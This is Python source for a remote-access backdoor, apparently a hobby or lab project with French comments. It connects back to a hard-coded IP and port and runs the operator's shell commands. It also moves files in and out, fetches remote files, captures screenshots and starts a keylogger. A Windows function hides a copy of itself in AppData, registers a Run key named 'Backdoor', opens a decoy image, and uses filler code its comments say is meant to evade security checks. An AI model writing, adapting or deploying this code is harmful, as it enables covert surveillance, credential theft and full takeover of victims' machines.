#!/usr/bin/python3

import socket
import subprocess
import json
import os
import sys
import time
import requests
from mss.linux import MSS as mss
import threading
import keyLoggerCustom as keylogger

def reliable_send_image(data):
    sock.send(data)

def reliable_recv_image():
    while True:
        data = b""
        try:
            data_recv = sock.recv(1024)
            data = b"".join([data, data_recv])
            return data
        except ValueError:
            continue
    

def reliable_send(data):
    print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
    if type(data) is not bytes:
        json_data = json.dumps(data)
    else:
        json_data = json.dumps(data.decode('utf-8'))
    json_data = json_data.encode()
    print("json_data -> {} ".format(json_data))
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data_recv = sock.recv(1024).decode('utf-8')
            data = data + data_recv
            return json.loads(data)
        except ValueError:
            continue

def isAdmin():
    try:
        # For windows
        #os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        os.listdir('/root')
        return "[+] Administrator privilegies"
    except:
        return "[-] User privilegies"


def downloadFileFromTargetComputer(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)

def screenshot():
    # for others
    #with mss() as screenshot:
    #for linux
    with mss(display=":0.0") as screenshot:
        print(screenshot)
        screenshot.shot(output="monitor-1.png")
        #monitor_1 = screenshot.monitors[1]
        #screenshot = screenshot.grab(monitor_1)
        

def connection():
    # ajout d'une tentative de connexion toute les 20 secondes au serveur
    while True:
        time.sleep(20)
        try:
            sock.connect(("10.0.2.15", 54321))
            shell()
        except:
            connection()
def shell():
    while True:
        command = reliable_recv()
        print("command -> {}".format(command))
        if command == 'q':
            continue
        elif command == "help":
            help_options = '''
                upload path     -> Upload a file to target PC
                get url         -> Download a File to target PC From Any Website
                start path      -> start a programm on target PC
                screenshot      -> Take a screenshot Of targets Monitor
                check           -> Check for the administrator privilegies
                q               -> Exit the Reverse SHell
                keylog_start    ->  start the keylogger
            '''
            reliable_send(help_options)
        elif len(command) > 1 and command[:2] == "cd":
            print("je rentre dans le cd")
            try:
                # on met que un espace apres le cd
                os.chdir(command[3:])
            except:
                continue
        elif len(command) > 1 and command[:8] == "download":
            print("je rentre bien dans download")
            #try:
            with open(command[9:], "rb") as file:
                reliable_send(file.read())
            #except:
            #    reliable_send("Failed to Download")
        elif len(command) > 1 and command[:6] == "upload":
            print("je suis dans upload")
            file_data = command.split(" | ")
            file_name = command[7:len(file_data[0])]
            with open(command[7:len(file_data[0])], "wb") as file:
                print("file_data -> {}".format(file_data[1]))
                print("file_name -> {}".format(file_name))
                file.write(file_data[1].encode())
        elif len(command) > 1 and command[:3] == "get":
            try:
                downloadFileFromTargetComputer(command[4:])
                reliable_send("[+] Downloaded File From Specified URL!")
            except:
                reliable_send("[-] Faile to Downloade File From Specified URL!")
        elif len(command) > 1 and command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as screen:
                    reliable_send_image(screen.read())
                #maintenant on supprime le fichier pour pas qu'il apparaisse
                #os.remove("monitor-1.png")

            except Exception as error:
                print(error)
                reliable_send("[-] We can't take the picture")
        # start comme ca permet de garder le shell ouvert plutot que de faire notepad qui lui aatendra fermeture de notepad pour 
        # recuperer le shell
        elif command[:5] == "start":
            try:
                # Popen pour ouvrir le processus
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started")
            except:
                reliable_send("[!!] Failed to start!")
        elif len(command) > 1 and command[:5] == "check":
            try:
                log_admin = isAdmin()
                reliable_send(log_admin)
            except:
                reliable_send("Cant Perform the check")
        elif command[:12] == "keylog_start":
            tl = threading.Thread(target=keylogger.start)
            # on start le thread
            tl.start()
        elif command[:11] == "keylog_dump":
            # pour windows
            #path_windows = os.environ["appdata"] + "\\processmanager.txt"
            path = "log.txt"
            file = open("log.txt", "r")
            reliable_send(file.read())
        elif command[:7] == "sendall":
            subprocess.Popen(command[8:], shell=True)
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result.decode('utf-8'))

def createBackdoorOnWindowsMachine():
    # on cree le path du fichier pour qu'il soit cacher
    location = os.environ["appdata"] + "\\windows32.exe"
    if not os.path.exists(location):
        #on copie le fichier dans un le dossier location pourqu'il soit imreperable, meme si l'autre est supprimer celui-ci restera
        shutil.copyfile(sys.executable, location)
        # on appelle une commande de l'invite de command windows
        # cette commande permet d'ajouter au registry de demarrage windows pour les logiciels 32 bits
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
        file_name = sys._MEIPASS + "\Dragon-Wallpaper-Chinese.jpg"
        try:
            subprocess.Popen(file_name, shell=True)
        except:
            # opération basic pour bypass les verif de secu qui vont voir ici un programme normal
            number = 1
            number1 = 2
            number3 = number + number1

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if __name__ == '__main__':
    connection()

